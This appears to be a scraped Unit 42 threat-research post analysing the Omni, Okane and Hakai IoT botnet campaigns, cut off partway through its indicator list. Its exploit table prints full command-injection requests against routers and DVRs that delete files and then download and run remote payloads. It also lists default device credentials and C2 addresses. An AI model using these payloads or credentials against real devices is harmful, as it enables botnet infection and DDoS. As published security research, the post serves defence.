<script type="text/javascript">
var main_site_url = 'https://www.paloaltonetworks.com';
var maindomain_lang = 'https://www.paloaltonetworks.com';
function getParameterByName(name, url) {
		if(url == null){
		  url = window.location.href;
		}
	    name = name.replace(/[\[\]]/g, '\\$&');
	    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
		results = regex.exec(url);
	    if (!results) return null;
	    if (!results[2]) return '';
	    return decodeURIComponent(results[2].replace(/\+/g, ' '));
	}
	var container_q = getParameterByName('container');
	var d_lang = 'en';	
</script>

	<title>Unit 42 Finds New Mirai and Gafgyt IoT/Linux Botnet Campaigns</title>

<meta property="og:readtime" content="10"/>
<meta property="og:views" content="141,671"/>
<meta property="og:date_created" content="July 20, 2018 at 5:00 AM"/>
<meta property="og:post_length" content="4285"/>
<meta property="og:category" content="Malware"/>
<meta property="og:category" content="Threat Research"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/malware/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/threat-research/"/>
<meta property="og:author" content="Ruchna Nigam"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/ruchna-nigam/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta name="post_tags" content="botnet,DDoS,exploits,Gafgyt,Hakai,IoT,Linux,Mirai,Okane,Omni"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Unit 42 Finds New Mirai and Gafgyt IoT\/Linux Botnet Campaigns","name":"Unit 42 Finds New Mirai and Gafgyt IoT\/Linux Botnet Campaigns","description":"Unit 42 documents the emergence of three malware campaigns built on publicly available source code for the Mirai and Gafgyt malware families that incorporate multiple known exploits affecting Internet of Things (IoT) device.","url":"https:\/\/unit42.paloaltonetworks.com\/unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns\/","datePublished":"July 20, 2018","articleBody":"The end of May 2018 has marked the emergence of three malware campaigns built on publicly available source code for the Mirai and Gafgyt malware families that incorporate multiple known exploits affecting Internet of Things (IoT) devices.\r\nSamples belonging to these campaigns incorporate as many as eleven exploits within a single sample, beating the IoT Reaper malware, which borrowed some of the Mirai source code but also came with an integrated LUA environment that incorporated nine exploits in its code.\r\nIn their newest evolution, samples also target the D-Link DSL-2750B OS Command Injection \u00a0vulnerability, only a few weeks after the publication of its Metasploit module on the 25th of May (even though the vulnerability has been public knowledge since February of 2016).\r\nWhile exploring samples belonging to one of these campaigns, I also discovered they support several new DDoS methods previously unused by Mirai variants.\r\nThis blog post details each campaign (in the chronological order they were observed) along with the exploits used, the new DDoS methods supported, ending in a comparative summary of the campaigns.\u00a0 Also covered is the tangential discovery of some Gafgyt samples incorporating new Layer 7 DDoS functionality targeting a known DDoS-protection provider.\r\nIOCs for different campaigns, if not mentioned under the corresponding section, can be found at the end of this blog post.\r\n\r\nCAMPAIGN 1: An evolution of Omni\r\nIn May 2018, the Omni botnet, a variant of Mirai, was found exploiting two vulnerabilities affecting Dasan GPON routers - CVE-2018-10561 (authentication bypass) and CVE-2018-1562 (command injection). The two vulnerabilities used in conjunction allow the execution of commands sent by an unauthenticated remote attacker to a vulnerable device.\r\nSince then the same family has evolved to incorporate several more exploits, detailed in Table 1.\r\nI used the sample below for this analysis\r\n\r\n\r\n\r\nSHA256\r\n3908cc1d8001f926031fbe55ce104448dbc20c9795b7c3cfbd9abe7b789f899d\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n\r\n\r\nVULNERABILITY\r\nAFFECTED DEVICES\r\nEXPLOIT FORMAT\r\n\r\n\r\nCVE-2018-10561, CVE-2018-10562\r\nDasan GPON routers\r\nXWebPageName=diag&amp;diag_action=ping&amp;wan_conlist=0&amp;dest_host=``;wget+http:\/\/%s\/gpon80+-O+-&gt;\/tmp\/gpon80;sh+\/tmp\/gpon80&amp;ipv=0\r\n\r\nXWebPageName=diag&amp;diag_action=ping&amp;wan_conlist=0&amp;dest_host=``;wget+http:\/\/%s\/gpon8080+-O+-&gt;\/tmp\/gpon8080;sh+\/tmp\/gpon8080&amp;ipv=0\r\n\r\n\r\nCVE-2014-8361\r\nDifferent devices using the Realtek SDK with the miniigd daemon\r\nPOST \/picsdesc.xml\r\n&lt;?xml version=\"1.0\" ?&gt;&lt;s:Envelope xmlns:s=\"http:\/\/schemas.xmlsoap.org\/soap\/envelope\/\" s:encodingStyle=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding\/\"&gt;&lt;s:Body&gt;&lt;u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"&gt;&lt;NewRemoteHost&gt;&lt;\/NewRemoteHost&gt;&lt;NewExternalPort&gt;47500&lt;\/NewExternalPort&gt;&lt;NewProtocol&gt;TCP&lt;\/NewProtocol&gt;&lt;NewInternalPort&gt;44382&lt;\/NewInternalPort&gt;&lt;NewInternalClient&gt;`cd \/tmp\/; rm -rf*; wget http:\/\/%s\/realtek`&lt;\/NewInternalClient&gt;&lt;NewEnabled&gt;1&lt;\/NewEnabled&gt;&lt;NewPortMappingDescription&gt;syncthing&lt;\/NewPortMappingDescription&gt;&lt;NewLeaseDuration&gt;0&lt;\/NewLeaseDuration&gt;&lt;\/u:AddPortMapping&gt;&lt;\/s:Body&gt;&lt;\/s:Envelope&gt;POST \/picsdesc.xml\r\n&lt;?xml version=\"1.0\" ?&gt;&lt;s:Envelope xmlns:s=\"http:\/\/schemas.xmlsoap.org\/soap\/envelope\/\" s:encodingStyle=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding\/\"&gt;&lt;s:Body&gt;&lt;u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"&gt;&lt;NewRemoteHost&gt;&lt;\/NewRemoteHost&gt;&lt;NewExternalPort&gt;47500&lt;\/NewExternalPort&gt;&lt;NewProtocol&gt;TCP&lt;\/NewProtocol&gt;&lt;NewInternalPort&gt;44382&lt;\/NewInternalPort&gt;&lt;NewInternalClient&gt;`cd \/tmp\/;chmod +x realtek;.\/realtek realtek`&lt;\/NewInternalClient&gt;&lt;NewEnabled&gt;1&lt;\/NewEnabled&gt;&lt;NewPortMappingDescription&gt;syncthing&lt;\/NewPortMappingDescription&gt;&lt;NewLeaseDuration&gt;0&lt;\/NewLeaseDuration&gt;&lt;\/u:AddPortMapping&gt;&lt;\/s:Body&gt;&lt;\/s:Envelope&gt;\r\n\r\n\r\nNetgear setup.cgi unauthenticated RCE\r\nDGN1000 Netgear routers\r\nGET \/setup.cgi?next_file=netgear.cfg&amp;todo=syscmd&amp;cmd=rm+-rf+\/tmp\/*;wget+http:\/\/%s\/netgear+-O+\/tmp\/netgear;sh+netgear&amp;curpath=\/&amp;currentsetting.htm=1\r\n\r\n\r\nCVE-2017-17215\r\nHuawei HG532\r\nPOST \/ctrlt\/DeviceUpgrade_1\r\n&lt;?xml version=\"1.0\" ?&gt;&lt;s:Envelope xmlns:s=\"http:\/\/schemas.xmlsoap.org\/soap\/envelope\/\" s:encodingStyle=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding\/\"&gt;&lt;s:Body&gt;&lt;u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"&gt;&lt;NewStatusURL&gt;$(\/bin\/busybox wget -g %s -l \/tmp\/huawei -r \/huawei; sh \/tmp\/huawei)&lt;\/NewStatusURL&gt;&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;\/NewDownloadURL&gt;&lt;\/u:Upgrade&gt;&lt;\/s:Body&gt;&lt;\/s:Envelope&gt;\r\n\r\n\r\nEir WAN Side Remote Command Injection\r\nEir D1000 routers\r\nPOST \/UD\/act?1\r\n&lt;?xml version=\"1.0\"?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http:\/\/schemas.xmlsoap.org\/soap\/envelope\/\" SOAP-ENV:encodingStyle=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding\/\"&gt;&lt;SOAP-ENV:Body&gt;&lt;u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1&amp;qu ot;&gt;&lt;NewNTPServer1&gt;`cd \/tmp &amp;&amp; rm -rf * &amp;&amp; \/bin\/busybox wget http:\/\/%s\/tr064 &amp;&amp; sh \/tmp\/tr064`&lt;\/NewNTPServer1&gt;&lt;NewNTPServer2&gt;`echo OMNI`&lt;\/NewNTPServer2&gt;&lt;NewNTPServer3&gt;`echo OMNI`&lt;\/NewNTPServer3&gt;&lt;NewNTPServer4&gt;`echo OMNI`&lt;\/NewNTPServer4&gt;&lt;NewNTPServer5&gt;`echo OMNI`&lt;\/NewNTPServer5&gt;&lt;\/u:SetNTPServers&gt;&lt;\/SOAP-ENV:Body&gt;&lt;\/SOAP-ENV:Envelope&gt;\r\n\r\nPOST \/UD\/act?1\r\n&lt;?xml version=\"1.0\"?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http:\/\/schemas.xmlsoap.org\/soap\/envelope\/\" SOAP-ENV:encodingStyle=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding\/\"&gt;&lt;SOAP-ENV:Body&gt;&lt;u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1&amp;qu ot;&gt;&lt;NewNTPServer1&gt;`cd \/tmp &amp;&amp; rm -rf * &amp;&amp; \/bin\/busybox wget http:\/\/%s\/tr064 &amp;&amp; sh \/tmp\/tr064`&lt;\/NewNTPServer1&gt;&lt;NewNTPServer2&gt;`echo OMNI`&lt;\/NewNTPServer2&gt;&lt;NewNTPServer3&gt;`echo OMNI`&lt;\/NewNTPServer3&gt;&lt;NewNTPServer4&gt;`echo OMNI`&lt;\/NewNTPServer4&gt;&lt;NewNTPServer5&gt;`echo OMNI`&lt;\/NewNTPServer5&gt;&lt;\/u:SetNTPServers&gt;&lt;\/SOAP-ENV:Body&gt;&lt;\/SOAP-ENV:Envelope&gt;\r\n\r\n\r\nHNAP SoapAction-Header Command Execution\r\nD-Link devices\r\nPOST \/HNAP1\/\r\nSOAPAction: http:\/\/purenetworks.com\/HNAP1\/`cd \/tmp &amp;&amp; rm -rf * &amp;&amp; wget http:\/\/%s\/hnap &amp;&amp; sh \/tmp\/hnap`\r\n\r\n(Faulty exploit:\r\nThis vulnerability stems from the fact that anything trailing the last '\/' after the string \u201chttp:\/\/purenetworks.com\/HNAP1\/GetDeviceSettings\u201d in the SoapAction header value is executed using the system command without sanitization\r\n\r\nIn this implementation, the exploit code is appended to \u201chttp:\/\/purenetworks.com\/HNAP1\/\u201d, and hence the above condition will not be triggered. To the best of my knowledge this exploit will not work on any devices)\r\n\r\n\r\n\r\n\r\nCCTV\/DVR Remote Code Execution\r\nCCTVs, DVRs from over 70 vendors\r\nGET \/language\/Swedish${IFS}&amp;&amp;cd${IFS}\/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http:\/\/%s\/crossweb;sh${IFS}\/tmp\/crossweb&amp;&gt;r&amp;&amp;tar${IFS}\/string.js\r\n\r\n\r\nJAWS Webserver unauthenticated shell command execution\r\nMVPower DVRs, among others\r\nGET \/shell?cd+\/tmp;rm+-rf+*;wget+http:\/\/%s\/jaws;sh+\/tmp\/jaws\r\n\r\n\r\nUPnP SOAP TelnetD Command Execution\r\nD-Link devices\r\nPOST \/soap.cgi?service=WANIPConn1\r\n&lt;?xml version=\"1.0\" ?&gt;&lt;s:Envelope xmlns:s=\"http:\/\/schemas.xmlsoap.org\/soap\/envelope\/\" s:encodingStyle=\"http:\/\/schemas.xmlsoap.org\/soap\/encoding\/\"&gt;&lt;SOAP-ENV:Body&gt;&lt;m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\"&gt;&lt;NewPortMappingDescription&gt;&lt;NewPortMappingDescription&gt;&lt;NewLeaseDuration&gt;&lt;\/NewLeaseDuration&gt;&lt;NewInternalClient&gt;`cd \/tmp;rm -rf *;wget http:\/\/%s\/dlink;sh \/tmp\/dlink`&lt;\/NewInternalClient&gt;&lt;NewEnabled&gt;1&lt;\/NewEnabled&gt;&lt;NewExternalPort&gt;634&lt;\/NewExternalPort&gt;&lt;NewRemoteHost&gt;&lt;\/NewRemoteHost&gt;&lt;NewProtocol&gt;TCP&lt;\/NewProtocol&gt;&lt;NewInternalPort&gt;45&lt;\/NewInternalPort&gt;&lt;\/m:AddPortMapping&gt;&lt;SOAPENV:Body&gt;&lt;SOAPENV:envelope&gt;\r\n\r\n\r\nNetgear cgi-bin Command Injection\r\nNetgear R7000\/R6400 devices\r\nGET \/cgi-bin\/;cd${IFS}\/var\/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http:\/\/%s\/netgear2;${IFS}sh${IFS}\/var\/tmp\/netgear2\r\n\r\n\r\nVacron NVR RCE\r\nVacron NVR devices\r\nGET \/board.cgi?cmd=cd+\/tmp;rm+-rf+*;wget+http:\/\/%s\/vacron;sh+\/tmp\/vacron\r\n\r\n\r\n\r\nAll of these vulnerabilities are publicly known and have been exploited by different botnets either separately or in combination with others in the past, however, this is the first Mirai variant using all eleven of them together.\r\nDifferentiating features of the campaign:\r\n\r\n \tTwo different encryption schemes: Aside from using the standard XOR encryption scheme seen in all Mirai variants, in this case using the table key 0xBAADF00D samples make use of a second key for the encryption of certain config strings.\r\n \tSamples rely solely on exploits for propagation and don\u2019t perform a credential brute-force attack.\r\n \tFurther infection of infected devices is prevented by dropping packets received on certain ports using iptables (Figure 1)\r\n\r\n\r\nFigure 1: Screenshot from malware disassembly showing the use of iptables to drop future connection attempts via certain ports\r\nThe campaign makes use of the IP 213[.]183.53.120 both for serving payloads, and as a Command and Control (C2) server.\r\nPivoting off this IP, I discovered some Gafgyt samples that surfaced around the same time reporting to the same IP, but using a new method named 'SendHTTPCloudflare'. This method is detailed at the end of this blog post.\r\nThis campaign was linked to the Omni variant on several references in the code as seen such as the one seen in Figure 2 below.\r\n\r\n\r\nFigure 2: OMNI reference in samples\r\n\r\nThe encrypted strings also reference a website gpon[.]party that was down at the time of this writing.\r\n\r\nFigure 3: gpon[.]party reference\r\nCAMPAIGN 2: Okane\r\nSamples from this campaign were served from the IP 46[.]243.189.101. This host briefly had an open directory containing the samples, as seen in the figure below.\r\n\r\nFigure 4: Screenshot from open directory at payload server 46[.]243.189.101\r\nThe payload source in this attack was located at hxxp:\/\/46[.]243.189.101\/gang\/. The downloaded payload is a shell script that attempts to replicate itself by downloading Okane binaries to vulnerable devices. \u00a0On the 13th of June, the payload source for some of these samples was briefly replaced with the Cloudflare DNS server 1[.]1.1.1.\r\nThis campaign incorporates the same exploits listed in Table 1. Figure 5 shows these exploits being called sequentially in one of the samples belonging to this campaign. Each call results in the creation of a dedicated fork for each exploit.\r\n\r\nFigure 5: Screenshot from malware disassembly of exploit calls in a sample from Campaign 2\r\nUnlike the previous campaign, these samples also perform a credential brute force attack. Some unusual entries were discovered on the brute force lists in these samples, such as the following:\r\n\r\n \troot\/t0talc0ntr0l4! - default credentials for Control4 devices\r\n \tadmin\/adc123 - default credentials for ADC FlexWave Prism devices\r\n \tmg3500\/merlin - default credentials for Camtron IP cameras\r\n\r\nSome samples belonging to this campaign include the addition of two new DDoS methods to the Mirai source code.\r\nBelow are descriptions of these new DDoS methods, extracted from the following sample.\r\n\r\n\r\n\r\nSHA256\r\n320ed65d955bdde8fb17a35024f7bd978d26c041de1ddcf8a592974f77d82401\r\n\r\n\r\n\r\n\r\n \tattack_method_tcpxmas: involves sending TCP packets with all flags set, also known as Christmas tree packet This could be considered a more effective means of DDoS since these packets \u201crequire much more processing by routers and end-hosts than the \"usual\" packets do.\u201d This method has already been observed used by Gafgyt and Kaiten variants in the past. The payload size of packets sent is set to 768 bytes.\r\n \tattack_method_std: involves sending packets with a randomized payload of 1024 bytes.\r\n\r\nDigging deeper reveals that samples using these attack methods have been part of a Mirai code fork from as early as August 2017.\r\nSome newer samples from the same campaign also integrate additional methods that only appear in samples from the beginning of June 2018. Some notable methods are detailed below.\r\nFor this analysis I used a sample with the following hash.\r\n\r\n\r\n\r\nSHA256\r\nbe1d722af56ba8a660218a8311c0482c5b2d096ba91485e7d9dfc12a2b8e00b3\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n \tattack_method_udpgame: UDP DDoS using SOCK_RAW from a random source port to the destination port 27015 (often used by online game servers).\r\n \tattack_method_asyn: TCP DDoS using packets with random source and destination ports, using packets with the ACK and SYN flags set.\r\n \tattack_method_tcpfrag: TCP DDoS using SOCK_RAW with random source and destination ports and sequence number, and flags URG, ACK, PSH, RST, SYN and FIN set. In this case the \u2018Don\u2019t Fragment\u2019 bit is set to 1.\r\n \tattack_method_tcpall: same as attack_method_tcpfrag above, except the \u2018Don\u2019t Fragment\u2019 bit is set to 0.\r\n \tattack_method_tcpusyn: TCP DDoS using packets with random source and destination ports, using packets with the URG and SYN flags set.\r\n\r\nOn the 19th of June, samples on this server were stripped of their exploits and reverted to using a simple brute force and subsequently dropping a shell script, for self-propagation.\r\n\r\n\r\nFigure 6: Shell script used by newer Okane samples for self-propagation\r\nCAMPAIGN 3: Hakai\r\nEarlier samples belonging to this campaign use all the exploits detailed in Table 1, except for the UPnP SOAP TelnetD Command Execution exploit. \u00a0The payload source for this campaign was hxxp:\/\/hakaiboatnet[.]pw\/m and the C2 server was 178[.]128.185.250. Samples make use of an encryption scheme similar to Mirai; unlike previous campaigns, they are built on the Gafgyt source code, which is also known as Bashlite, Lizkebab, Torlus or LizardStresser.\r\nSamples listen for the following commands:\r\n\r\n\r\n\r\nCommand\r\nTranslation\r\n\r\n\r\nSC ON\r\nScanner On\r\n\r\n\r\nSC OFF\r\nScanner Off\r\n\r\n\r\nH\r\nHTTP Flood\r\n\r\n\r\nU\r\nUDP Flood\r\n\r\n\r\nS\r\nSTD Flood\r\n\r\n\r\nT\r\nTCP Flood\r\n\r\n\r\nKT\r\nKill scanner threads\r\n\r\n\r\n\r\nNewer samples from the same server were found to have also incorporated an OS Command Injection exploit against D-Link DSL-2750B devices. These samples use the same attack methods, encryption key and C2 as the samples above, however they source their payload from hxxp:\/\/178[.]128.185.250\/e.\r\n\r\n\r\nFigure 7: Exploit targeting D-Link DSL-2750B devices used in newer samples of the campaign\r\nSummary\r\nTable 2 shows a comparative summary of the three campaigns\r\n\r\n\r\n\r\nCampaign\r\nExploits Used\r\nBuilt on\r\nPayload source\r\nC2\r\nConfig string encryption\/decryption key\r\nAlso brute forces credentials?\r\n\r\n\r\n1: Evolution of OMNI\r\nAll exploits in Table 1\r\nMirai\r\nhxxp:\/\/213[.]183.53.120\r\n213[.]183.53.120\r\nTwo different keys used \u2013 0xBAADF00D, 0xDEADBEEF (or the equivalent of a byte-wise XOR with 0x22)\r\nNo\r\n\r\n\r\n2: Okane\r\nAll exploits in Table 1\r\nMirai\r\nhxxp:\/\/46[.]243.189.101\/gang\/\r\n142[.]129.169.83:5888\r\n0xDEACFBEF\r\nYes\r\n\r\n\r\n3: Hakai\r\nAll exploits in Table 1, except UPnP SOAP TelnetD Command Execution. Newer samples also incorporate a D-Link DSL-2750B OS Command Injection exploit\r\nGafgyt\r\nhxxp:\/\/hakaiboatnet[.]pw\/m,\r\nhxxp:\/\/ 178[.]128.185.250\/e\r\n178[.]128.185.250\r\n0xDEDEFFBA\r\nYes\r\n\r\n\r\n\r\nTable 2: Comparative summary of the attack campaigns\r\nGafgyt with a new Layer-7 attack\r\nLayer-7 DDoS attacks targeting specific DDoS protection service vendors are not new and were already observed in the form of the DvrHelper variant of Mirai.\r\nThey have however not been observed used by Gafgyt samples until now. While pivoting on the C2 used by samples of Campaign 1, I came across some Gafgyt samples listening for an additional command called HTTPCF.\r\nWhen this command is received, the bot calls a function called SendHTTPCloudflare that does as its name suggests, targeting a URL path used mostly by sites protected by Cloudflare. The earliest samples observed using this attack were from the end of May 2018.\r\n\r\nFigure 8: URL format targeted by HTTPCF\r\nSamples use the same IP i.e. 213[.]183.53.120 at port 8013 for C2 communication.\r\nThey also make use of some unusual User-Agents (UA) as seen in Figure 9. All UAs found in these samples are listed in the appendix\r\n\r\nFigure 9: Some unusual User Agents found in related Gafgyt samples\r\nConclusion\r\nThe initial rise of botnets targeting embedded systems had brought to light the security risks from millions of Internet-connected devices configured with default credentials.\r\nThe evolution of these botnets to the use of multiple exploits, be it IoT Reaper or the campaigns discussed here, shows how attackers can build enormous botnets consisting of different types of devices, all responding to the same C2 server. This is exacerbated by the speed of exploitation in the wild of newly released vulnerabilities and also highlights the need for security vendor reactivity in response to these disclosures, applicable to the subset of these devices that do fall under the protection of security devices. However, the onus is on device manufacturers to ensure their devices are easy to update, and that they deploy the updates in a timely manner.\r\nPalo Alto Networks customers benefit from the following protections against these attacks:\r\nAutoFocus customers can track these activities using individual exploit tags:\r\n\r\n \tCVE-2017-17215\r\n \tCVE-2014-8361\r\n \tDLinkOSInjection\r\n \tNetgearRCE\r\n \tVacronNVRRCE\r\n \tEirRCE\r\n \tGPONExploits\r\n \tDLinkDSL2750BOSCmdInjection\r\n\r\nAutoFocus customers can also use the following malware family tags :\r\n\r\n \tGafygt\r\n \tELFMirai\r\n\r\nWildFire detects all related samples with malicious verdicts.\r\nAll exploits and IPs\/URLs involved in these campaigns are blocked through Threat Prevention and PANDB.\r\n\r\nIndicators of Compromise\r\n\r\n\r\n\r\nCampaign 1 samples\r\n\r\n\r\n000b018848e7fd947e87f1d3b8432faccb3418e0029bde7db8abf82c552bbc63\r\n\r\n\r\n37e3a07a17a82175c60992f18eaf169e4014915eb90fac5b4704060572cfa60b\r\n\r\n\r\n3908cc1d8001f926031fbe55ce104448dbc20c9795b7c3cfbd9abe7b789f899d\r\n\r\n\r\n3b3a66c2c27f5821d5304e22a2a34b044027ffaac327df5263674b4aa25bc901\r\n\r\n\r\n4c07af1041e0d83437d4b14226204652574b428cd1dbd4bfc7047c13dffc4700\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n\r\n\r\nCampaign 1 related URLs\/IPs\r\n\r\n\r\n213[.]183.53.120\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n\r\n\r\nOkane Multi-exploit samples\r\n\r\n\r\n00499879c74122881e436fbf701a823d4dc53ff6946e58dd0e5410bad24f3d57\r\n\r\n\r\n0fa81ebe444cfe7413f90ca116817cdfa3ccfdc41160fcd64032630d30b2d598\r\n\r\n\r\n11628ac93368228e949d9b7e380a065e58c02626a8fd7896db8c2dec51583d1d\r\n\r\n\r\n1d6c5a560bbb57695c502b5d642e48fbe6bddc45defdb56fa25bd94ae17e5a14\r\n\r\n\r\n216492260b8d1342988c1688962dd95a48af8c801afe03c6801ec07d74862e60\r\n\r\n\r\n264a194bda6aaa51665d5c872237613ac153e67827e7b0bbbe84b4e8e464544c\r\n\r\n\r\n38736acdf58a418acd778a3203df9e84b4470a71031fe9e6d52170ad3c15e794\r\n\r\n\r\n39893d4a033fd29faea37d09b4c8cfb9be04ffc19288506551e18d294e96bb2d\r\n\r\n\r\n49f98a91c95a633a6d7a9a134e3a8e881e12aeede758a4367432ad3cab1c2b28\r\n\r\n\r\n50473fc0d89fd5ed0a20c96f34c419c5ee66e630fecb88a095283450229a934e\r\n\r\n\r\n509a7cc2335ef667ddc20298a3fae9c9c966be400719343cb59b042d05a98426\r\n\r\n\r\n5352dc35d97ceb2d9bf58113ee1196daea66cd4a4bce9acba29ee05f4d84170e\r\n\r\n\r\n55771db22c6305f7fba0b20b19b8537e85a45b80ddbcba1ffe0f6d30ef8697d6\r\n\r\n\r\n645128d788b5cc1becc2546973e658c03e2ee33116013b84c05904a18044e353\r\n\r\n\r\n834e675813e517aa0b4b6c65edbb2e8bf141b272f6918b443c69793db365ff3b\r\n\r\n\r\n893309bc397058d50bba7c5c077bfc7f64956a098e452c63813c074beb8837dc\r\n\r\n\r\n8b65ac91af993f95b57535e5a71571bbc06fbb37e1bfd47313585dceda345fd9\r\n\r\n\r\n916cf77c6af335732007fd0c09ec49b8f29053731a062c33a66d65793495dcd5\r\n\r\n\r\n93fa2bb5a64216d8579a53debcb9b2dade3a0a995c3026b04667fd472e7841a3\r\n\r\n\r\n9e150ccd410ed8a3a8673e092450bd6dc0f5abc2d7306e2d05b57cfb21d8d4df\r\n\r\n\r\n9fe586ead4a1b003c023c75467c9b1fcda3414265ea50e060e939a4078c79234\r\n\r\n\r\na0d7592cfcd469e10a9ca463780737c76d3e61c5b750345998b18721b3565f0d\r\n\r\n\r\na36adfa5ecec9ad5429c817de3fbece20d1b526c116d2bfccd9366aabacc2c32\r\n\r\n\r\nac7bb0c8bf67186572ee931f86f679e12f6737d8e36936fb40a870dc3aeeee22\r\n\r\n\r\nb2156ce005eacccabe0ed668bbced761df1da1f1da32e645d344eaa8f075dbb9\r\n\r\n\r\nb55bea0bf708734491d101f41ecdbb592e69b8ccc053b7dfc33fe3e465c80b9f\r\n\r\n\r\nb72c22efed4b68d52fbc97360c388fc1812d431c208cf35af5bdcc850e8a2e01\r\n\r\n\r\nbc11fcafe415b1bf74abbeb5189cb72f991bb6dfb01b61f2d96cbb4cfd6d9e2f\r\n\r\n\r\nbd89be28ddecca983cc91835febce818a1f09bda471399b031f99c5278169344\r\n\r\n\r\nbf94315a9591d77ee2d08823afaeaf7e45133d4af2d3c3ce4086aff371f248d2\r\n\r\n\r\nc02a7a06f77bad974acd6bc193e1cb7dc73a009317f1044d202593dc3b0a67cf\r\n\r\n\r\nc42bdc0d7bbdf9a74db9233010f2b04ca14e0864119a1c98d6c8a7a63574791c\r\n\r\n\r\nc659709cbea976692e4be58f1f04d99127b55325f404c63525fb9ab575a66b2d\r\n\r\n\r\nc750d1ad0d5f5d7dda2ab8dba33fa49ef1c636905abab364a70db44ab8035ab6\r\n\r\n\r\ncfd33c0bcb7001c56a8e9438c1a5d6b34c6bdd7a2404c2fe0cdfea00abdf355a\r\n\r\n\r\nd15d46b4d9d826bcf8cb0b43fa1f7e874708db9bb068c3aff27daa7193b51fd7\r\n\r\n\r\nd2655773f812887da069965ad8113501aeb0a0e26aa27faa9a1469fd510ceb3c\r\n\r\n\r\ndacdf9b548f123482f5ecc2a29d2d156021bdab250a933ace9aee140041b9abb\r\n\r\n\r\ndbdffabc13a70a41188900620569266b5774deb007e0ef6dc63ff16ce72b4595\r\n\r\n\r\ndcfae13f567ea01c872db539c5d89448ebde2debe46421eccf752d4e20298c58\r\n\r\n\r\ne0ddec27709ec513886a217009f55994ddf61f58887774d6403ec18d5612d9e6\r\n\r\n\r\ne8782c38fc7c148be589a3c44f915719378840ddbf709fd48932797609f8daf2\r\n\r\n\r\nec1fdb298556406d75506a234562f60ae517569963a317741dd4bd90680fb4ad\r\n\r\n\r\nedf32e6317253a323c4e815485ff4b97c4e0af268be8d78c9c0e48ac87e52e55\r\n\r\n\r\nf390995777d4cad93854e4030b8bc33d2405c7ddd548da5e00a589b9e7afd722\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n\r\n\r\nOkane related IPs\/URLs\r\n\r\n\r\n46[.]243.189.101\r\n\r\n\r\n142[.]129.169.83:5888\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n\r\n\r\nOkane Multi-exploit samples fetching payload from 1.1.1.1\r\n\r\n\r\n25763b7871c0be5dc9a3ffa4abb4fce308297baf14c0389a70336b429b0c7c39\r\n\r\n\r\n7bde2df856061806a1a7294b780bfbcf1439ec0f9dbb4d6495c7c0d5873505d5\r\n\r\n\r\nfca262afd92ec24af4370c664b68f453c3f97f3555ab37178ec80bbaebf7dfa6\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n\r\n\r\nOkane Multi-exploit samples using attack_method_tcpxmas and attack_method_std\r\n\r\n\r\n0e7d4fa178b78cbfd0eaea910a53c7b933590764b72a93cd54f5823076869ab5\r\n\r\n\r\n320ed65d955bdde8fb17a35024f7bd978d26c041de1ddcf8a592974f77d82401\r\n\r\n\r\n5eef17f59d2c3d88d08da8d07dcca13e4225d800fce7a7fed5504e789008dc17\r\n\r\n\r\n692b3b9ea76447447b11655711cdd22040972b1903749fe49b478ec92cdd4f7a\r\n\r\n\r\na0d7592cfcd469e10a9ca463780737c76d3e61c5b750345998b18721b3565f0d\r\n\r\n\r\na36adfa5ecec9ad5429c817de3fbece20d1b526c116d2bfccd9366aabacc2c32\r\n\r\n\r\nc42bdc0d7bbdf9a74db9233010f2b04ca14e0864119a1c98d6c8a7a63574791c\r\n\r\n\r\nd15d46b4d9d826bcf8cb0b43fa1f7e874708db9bb068c3aff27daa7193b51fd7\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n\r\n\r\nOkane sample without exploits using several additional DDoS methods\r\n\r\n\r\n0ea858e747863f2c94eda3f28167951ad8cafca2cb0be1c247d01a53fb7e56e0\r\n\r\n\r\nbe1d722af56ba8a660218a8311c0482c5b2d096ba91485e7d9dfc12a2b8e00b3\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n\r\n\r\nHakai 